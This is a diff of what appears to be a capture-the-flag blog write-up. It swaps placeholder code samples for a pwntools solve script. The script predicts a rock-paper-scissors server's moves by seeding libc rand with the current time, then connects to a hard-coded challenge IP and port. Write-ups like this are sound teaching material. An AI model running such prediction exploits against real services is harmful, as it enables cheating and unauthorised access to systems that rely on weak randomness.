@@ -103,21 +103,33 @@ Knowing this, we are ready to exploit the binary! If we can set the seed for the
 
 ## [](#solution)Crafting Our Exploit
 
-The moment you all have been waiting for!
+The moment you all have been waiting for! I have attached my solve.py script below for you to view before I break it down.
 
-```js
-// Javascript code with syntax highlighting.
-var fun = function lang(l) {
-  dateformat.i18n = require('./lang/' + l)
-  return true;
-}
-```
+```py
+from pwn import *
+#context.log_level='debug'
+from ctypes import CDLL
+import sys
 
-```ruby
-# Ruby code with syntax highlighting
-GitHubPages::Dependencies.gems.each do |gem, version|
-  s.add_dependency(gem, "= #{version}")
-end
+libc = CDLL('libc.so.6')
+def retry():
+	r = remote('64.227.41.83',30682)
+	line = r.recvline()
+	r.send(b'1\n')
+	choices=[b'paper\n',b'rock\n',b'scissors\n']
+	for i in range(0,100):
+		print(i)
+		time = libc.time(0)
+		libc.srand(time)
+		choice = libc.rand()%3
+		try:
+			line = r.recvuntil('>> ',drop=True)
+		except:
+			r.close()
+			retry()
+		r.send(choices[choice])
+	r.interactive()
+retry()
 ```
 
 #### [](#header-4)Header 4
